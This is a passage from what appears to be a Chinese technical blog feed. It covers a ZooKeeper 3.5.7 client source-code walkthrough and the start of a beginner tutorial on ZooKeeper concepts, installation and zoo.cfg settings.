EventThread();</span><br><span class="line">    <span class="keyword">this</span>.clientConfig=zooKeeper.getClientConfig();</span><br><span class="line">    initRequestTimeout();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击SendThread，查找run方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ZooKeeperThread 是一个线程，执行它的 run()方法</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    clientCnxnSocket.introduce(<span class="keyword">this</span>, sessionId, outgoingQueue);</span><br><span class="line">    clientCnxnSocket.updateNow();</span><br><span class="line">    clientCnxnSocket.updateLastSendAndHeard();</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">long</span> lastPingRwServer = Time.currentElapsedTime();</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> MAX_SEND_PING_INTERVAL = <span class="number">10000</span>; <span class="comment">//10 seconds</span></span><br><span class="line">    InetSocketAddress serverAddress = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 在循环里面，循环发送，循环接收</span></span><br><span class="line">    <span class="keyword">while</span> (state.isAlive()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!clientCnxnSocket.isConnected()) &#123;</span><br><span class="line">                <span class="comment">// don't re-establish connection if we are closing</span></span><br><span class="line">                <span class="keyword">if</span> (closing) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (rwServerAddress != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    serverAddress = rwServerAddress;</span><br><span class="line">                    rwServerAddress = <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    serverAddress = hostProvider.next(<span class="number">1000</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 启动连接服务端</span></span><br><span class="line">                startConnect(serverAddress);</span><br><span class="line">             ......</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If we are in read-only mode, seek for read/write server</span></span><br><span class="line">            <span class="keyword">if</span> (state == States.CONNECTEDREADONLY) &#123;</span><br><span class="line">                <span class="keyword">long</span> now = Time.currentElapsedTime();</span><br><span class="line">                <span class="keyword">int</span> idlePingRwServer = (<span class="keyword">int</span>) (now - lastPingRwServer);</span><br><span class="line">                <span class="keyword">if</span> (idlePingRwServer &gt;= pingRwTimeout) &#123;</span><br><span class="line">                    lastPingRwServer = now;</span><br><span class="line">                    idlePingRwServer = <span class="number">0</span>;</span><br><span class="line">                    pingRwTimeout =</span><br><span class="line">                        Math.min(<span class="number">2</span>*pingRwTimeout, maxPingRwTimeout);</span><br><span class="line">                    pingRwServer();</span><br><span class="line">                &#125;</span><br><span class="line">                to = Math.min(to, pingRwTimeout - idlePingRwServer);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 接收服务端响应，并处理</span></span><br><span class="line">            clientCnxnSocket.doTransport(to, pendingQueue, ClientCnxn.<span class="keyword">this</span>);</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startConnect</span><span class="params">(InetSocketAddress addr)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    logStartConnect(addr);</span><br><span class="line">    <span class="comment">// 建立连接</span></span><br><span class="line">    clientCnxnSocket.connect(addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl + alt +B 查找 connect 实现类，ClientCnxnSocketNIO.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">connect</span><span class="params">(InetSocketAddress addr)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    SocketChannel sock = createSock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">       registerAndConnect(sock, addr);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        LOG.error(<span class="string">"Unable to open socket to "</span> + addr);</span><br><span class="line">        sock.close();</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    initialized = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Reset incomingBuffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    lenBuffer.clear();</span><br><span class="line">    incomingBuffer = lenBuffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerAndConnect</span><span class="params">(SocketChannel sock, InetSocketAddress addr)</span> </span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    sockKey = sock.register(selector, SelectionKey.OP_CONNECT);</span><br><span class="line">    <span class="keyword">boolean</span> immediateConnect = sock.connect(addr);</span><br><span class="line">    <span class="keyword">if</span> (immediateConnect) &#123;</span><br><span class="line">        sendThread.primeConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">primeConnection</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    LOG.info(<span class="string">"Socket connection established, initiating session, client: &#123;&#125;, server: &#123;&#125;"</span>,</span><br><span class="line">    clientCnxnSocket.getLocalSocketAddress(),</span><br><span class="line">    clientCnxnSocket.getRemoteSocketAddress());</span><br><span class="line">    <span class="comment">// 标记不是第一次连接</span></span><br><span class="line">    isFirstConnect = <span class="keyword">false</span>;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl + alt +B 查找 doTransport 实现类，ClientCnxnSocketNIO.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doTransport</span><span class="params">(<span class="keyword">int</span> waitTimeOut, List&lt;Packet&gt; pendingQueue, ClientCnxn cnxn)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">    selector.select(waitTimeOut);</span><br><span class="line">    Set&lt;SelectionKey&gt; selected;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        selected = selector.selectedKeys();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Everything below and until we get back to the select is</span></span><br><span class="line">    <span class="comment">// non blocking, so time is effectively a constant. That is</span></span><br><span class="line">    <span class="comment">// Why we just have to do this once, here</span></span><br><span class="line">    updateNow();</span><br><span class="line">    <span class="keyword">for</span> (SelectionKey k : selected) &#123;</span><br><span class="line">        SocketChannel sc = ((SocketChannel) k.channel());</span><br><span class="line">        <span class="keyword">if</span> ((k.readyOps() &amp; SelectionKey.OP_CONNECT) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sc.finishConnect()) &#123;</span><br><span class="line">                updateLastSendAndHeard();</span><br><span class="line">                updateSocketAddresses();</span><br><span class="line">                sendThread.primeConnection();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((k.readyOps() &amp; (SelectionKey.OP_READ | SelectionKey.OP_WRITE)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 读取服务端应答</span></span><br><span class="line">            doIO(pendingQueue, cnxn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sendThread.getZkState().isConnected()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (findSendablePacket(outgoingQueue,</span><br><span class="line">                sendThread.tunnelAuthInProgress()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            enableWrite();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    selected.clear();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-5-执行-run">7.5 执行 run()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> CliException, IOException, InterruptedException</span>&#123;</span><br><span class="line">    ZooKeeperMain main = <span class="keyword">new</span> ZooKeeperMain(args);</span><br><span class="line">    main.run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> CliException, IOException, InterruptedException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">if</span> (jlinemissing) &#123;</span><br><span class="line">            System.out.println(<span class="string">"JLine support is disabled"</span>);</span><br><span class="line">            BufferedReader br =</span><br><span class="line">                <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in));</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 一行一行读取命令</span></span><br><span class="line">                executeLine(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Command line args non-null.  Run what was passed.</span></span><br><span class="line">        processCmd(cl);</span><br><span class="line">    &#125;</span><br><span class="line">    System.exit(exitCode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeLine</span><span class="params">(String line)</span> <span class="keyword">throws</span> CliException, InterruptedException, IOException </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!line.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">    cl.parseCommand(line);</span><br><span class="line">    addToHistory(commandCount,line);</span><br><span class="line">    <span class="comment">// 处理客户端命令</span></span><br><span class="line">    processCmd(cl);</span><br><span class="line">    commandCount++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">processCmd</span><span class="params">(MyCommandOptions co)</span> <span class="keyword">throws</span> CliException, IOException, InterruptedException </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> watch = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 解析命令</span></span><br><span class="line">        watch = processZKCmd(co);</span><br><span class="line">        exitCode = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (CliException ex) &#123;</span><br><span class="line">        exitCode = ex.getExitCode();</span><br><span class="line">        System.err.println(ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> watch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">processZKCmd</span><span class="params">(MyCommandOptions co)</span> <span class="keyword">throws</span> CliException, IOException, InterruptedException </span>&#123;</span><br><span class="line">    String[] args = co.getArgArray();</span><br><span class="line">    String cmd = co.getCommand();</span><br><span class="line">    <span class="keyword">if</span> (args.length &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        usage();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedCommandException(<span class="string">"No command entered"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!commandMap.containsKey(cmd)) &#123;</span><br><span class="line">        usage();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> CommandNotFoundException(<span class="string">"Command not found "</span> + cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">boolean</span> watch = <span class="keyword">false</span>;</span><br><span class="line">    LOG.debug(<span class="string">"Processing "</span> + cmd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cmd.equals(<span class="string">"quit"</span>)) &#123;</span><br><span class="line">        zk.close();</span><br><span class="line">        System.exit(exitCode);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.equals(<span class="string">"redo"</span>) &amp;&amp; args.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        Integer i = Integer.decode(args[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span> (commandCount &lt;= i || i &lt; <span class="number">0</span>) &#123; <span class="comment">// don't allow redoing this redo</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MalformedCommandException(<span class="string">"Command index out of range"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        cl.parseCommand(history.get(i));</span><br><span class="line">        <span class="keyword">if</span> (cl.getCommand().equals(<span class="string">"redo"</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MalformedCommandException(<span class="string">"No redoing redos"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        history.put(commandCount, history.get(i));</span><br><span class="line">        processCmd(cl);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.equals(<span class="string">"history"</span>)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = commandCount - <span class="number">10</span>; i &lt;= commandCount; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            System.out.println(i + <span class="string">" - "</span> + history.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.equals(<span class="string">"printwatches"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length == <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"printwatches is "</span> + (printWatches ? <span class="string">"on"</span> : <span class="string">"off"</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            printWatches = args[<span class="number">1</span>].equals(<span class="string">"on"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.equals(<span class="string">"connect"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">            connectToZK(args[<span class="number">1</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            connectToZK(host);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Below commands all need a live connection</span></span><br><span class="line">    <span class="keyword">if</span> (zk == <span class="keyword">null</span> || !zk.getState().isAlive()) &#123;</span><br><span class="line">        System.out.println(<span class="string">"Not connected"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// execute from commandMap</span></span><br><span class="line">    CliCommand cliCmd = commandMapCli.get(cmd);</span><br><span class="line">    <span class="keyword">if</span>(cliCmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">        cliCmd.setZk(zk);</span><br><span class="line">        watch = cliCmd.parse(args).exec();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!commandMap.containsKey(cmd)) &#123;</span><br><span class="line">         usage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> watch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Zookeeper3.5.7源码分析&lt;/h1&gt;
&lt;h1&gt;一、Zookeeper算法一致性&lt;/h1&gt;
&lt;h2 id=&quot;1、Paxos-算法&quot;&gt;1、Paxos 算法&lt;/h2&gt;
&lt;h3 id=&quot;1-1-概述&quot;&gt;1.1 概述&lt;/h3&gt;
&lt;p&gt;Paxos算法：一种基于消息传递且具有高度容错特性的一致性算法。Paxos算法解决的问题：就是如何快速正确的在一个分布式系统中对某个数据值达成一致，并且保证不论发生任何异常，都不会破坏整个系统的一致性。&lt;/p&gt;
&lt;p&gt;在一个Paxos系统中，首先将所有节点划分为Proposer（提议者），Acceptor（接受者），和Learner（学习者）。（注意：每个节点都可以身兼数职），一个完整的Paxos算法流程分为三个阶段：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Prepare准备阶段&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Proposer向多个Acceptor发出Propose请求Promise（承诺）&lt;/li&gt;
&lt;li&gt;Acceptor针对收到的Propose请求进行Promise（承诺）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Accept接受阶段&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Proposer收到多数Acceptor承诺的Promise后，向Acceptor发出Propose请求&lt;/li&gt;
&lt;li&gt;Acceptor针对收到的Propose请求进行Accept处理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Learn学习阶段&lt;/strong&gt;：Proposer将形成的决议发送给所有Learners&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Zookeeper3.5.7基础学习</title>
    <link href="https://blog.shawncoding.top/posts/15b652da.html"/>
    <id>https://blog.shawncoding.top/posts/15b652da.html</id>
    <published>2024-02-06T07:04:40.000Z</published>
    <updated>2024-02-29T12:07:23.441Z</updated>
    
    <content type="html"><![CDATA[<h1>Zookeeper3.5.7基础学习</h1><h1>一、Zookeeper入门</h1><blockquote><p>官网：<a href="https://zookeeper.apache.org/" target="_blank" rel="noopener" title="https://zookeeper.apache.org/">https://zookeeper.apache.org/</a></p></blockquote><h2 id="1、概述">1、概述</h2><blockquote><p>Zookeeper 是一个开源的分布式的，为分布式框架提供协调服务的 Apache 项目</p></blockquote><p>Zookeeper从设计模式角度来理解：是一个基于观察者模式设计的分布式服务管理框架，它<strong>负责存储和管理大家都关心的数据</strong>，然后接受观察者的注册，一旦这些数据的状态发生变化，Zookeeper就将负责通知已经在Zookeeper上注册的那些观察者做出相应的反应**。Zookeeper=文件系统+通知机制**</p><a id="more"></a><h2 id="2、特点">2、特点</h2><ul><li>Zookeeper：一个领导者（Leader），多个跟随者（Follower）组成的集群</li><li>集群中只要有<strong>半数以上</strong>节点存活，Zookeeper集群就能正常服务。所以Zookeeper适合安装奇数台服务器</li><li>全局数据一致：每个Server保存一份相同的数据副本，Client无论连接到哪个Server，数据都是一致的</li><li>更新请求顺序执行，来自同一个Client的更新请求按其发送顺序依次执行</li><li>数据更新原子性，一次数据更新要么成功，要么失败</li><li>实时性，在一定时间范围内，Client能读到最新数据</li></ul><h2 id="3、数据结构">3、数据结构</h2><p>ZooKeeper 数据模型的结构与 <strong>Unix 文件系统很类似</strong>，整体上可以看作是一棵树，每个节点称做一个 ZNode。每一个 ZNode <strong>默认能够存储 1MB 的数据</strong>，每个 ZNode 都可以通过其路径唯一标识</p><h2 id="4、应用场景">4、应用场景</h2><p>提供的服务包括：统一命名服务、统一配置管理、统一集群管理、服务器节点动态上下线、软负载均衡等</p><ul><li><strong>统一命名服务</strong></li></ul><p>在分布式环境下，经常需要对应用/服务进行统一命名，便于识别。例如：IP不容易记住，而域名容易记住</p><ul><li><strong>统一配置管理</strong></li></ul><p>分布式环境下，配置文件同步非常常见。一般要求一个集群中，所有节点的配置信息是一致的，比如 Kafka 集群。对配置文件修改后，希望能够快速同步到各个节点上。配置管理可交由ZooKeeper实现。可将配置信息写入ZooKeeper上的一个Znode；各个客户端服务器监听这个Znode；一旦Znode中的数据被修改，ZooKeeper将通知各个客户端服务器。</p><ul><li><strong>统一集群管理</strong></li></ul><p>分布式环境中，实时掌握每个节点的状态是必要的。可根据节点实时状态做出一些调整。ZooKeeper可以实现实时监控节点状态变化可将节点信息写入ZooKeeper上的一个ZNode。监听这个ZNode可获取它的实时状态变化。</p><ul><li><strong>服务器动态上下线</strong></li></ul><p>客户端能实时洞察到服务器上下线的变化</p><ul><li><strong>软负载均衡</strong></li></ul><p>在Zookeeper中记录每台服务器的访问数，让访问数最少的服务器去处理最新的客户端请求</p><h1>二、Zookeeper 安装部署</h1><h2 id="1、本地模式安装">1、本地模式安装</h2><h3 id="1-1-基础操作">1.1 基础操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先自行安装jdk，这里我就继续在之前的hadoop集群上继续操作了</span></span><br><span class="line">wget https://archive.apache.org/dist/zookeeper/zookeeper-3.5.7/apache-zookeeper-3.5.7-bin.tar.gz</span><br><span class="line">tar -zxvf apache-zookeeper-3.5.7-bin.tar.gz -C /opt/module/</span><br><span class="line"><span class="built_in">cd</span> /opt/module/</span><br><span class="line">mv apache-zookeeper-3.5.7-bin/ zookeeper-3.5.7/</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============配置修改=============</span></span><br><span class="line"><span class="comment"># 将/opt/module/zookeeper-3.5.7/conf 这个路径下的 zoo_sample.cfg 修改为 zoo.cfg</span></span><br><span class="line">mv zoo_sample.cfg zoo.cfg</span><br><span class="line"><span class="comment"># 打开 zoo.cfg 文件，修改 dataDir 路径</span></span><br><span class="line">vim zoo.cfg</span><br><span class="line"><span class="comment"># 修改如下内容</span></span><br><span class="line">dataDir=/opt/module/zookeeper-3.5.7/zkData</span><br><span class="line"><span class="comment"># 在/opt/module/zookeeper-3.5.7/这个目录上创建 zkData 文件夹</span></span><br><span class="line">mkdir zkData</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============操作 Zookeeper============</span></span><br><span class="line"><span class="comment"># 启动 Zookeeper</span></span><br><span class="line">bin/zkServer.sh start</span><br><span class="line"><span class="comment"># 查看进程是否启动</span></span><br><span class="line">jps</span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">bin/zkServer.sh status</span><br><span class="line"><span class="comment"># 启动客户端</span></span><br><span class="line">bin/zkCli.sh</span><br><span class="line">quit</span><br><span class="line"><span class="comment"># 停止 Zookeeper</span></span><br><span class="line">bin/zkServer.sh stop</span><br></pre></td></tr></table></figure><h3 id="1-2-配置参数解读">1.2 配置参数解读</h3><p><code>vim zoo.cfg</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通信心跳时间，Zookeeper服务器与客户端心跳时间，单位毫秒</span></span><br><span class="line">tickTime=2000</span><br><span class="line"><span class="comment"># LF初始通信时限,Leader和Follower初始连接时能容忍的最多心跳数（tickTime的数量）</span></span><br><span class="line"><span class="comment"># 指定了Zookeeper集合中的Follower节点（从节点）在连接到Leader节点（主节点）时能够等待的时间量。在这个时间范围内，如果从节点不能连接到Leader节点，则从节点将放弃连接尝试</span></span><br><span class="line">initLimit=10</span><br><span class="line"><span class="comment"># LF同步通信时限</span></span><br><span class="line"><span class="comment"># 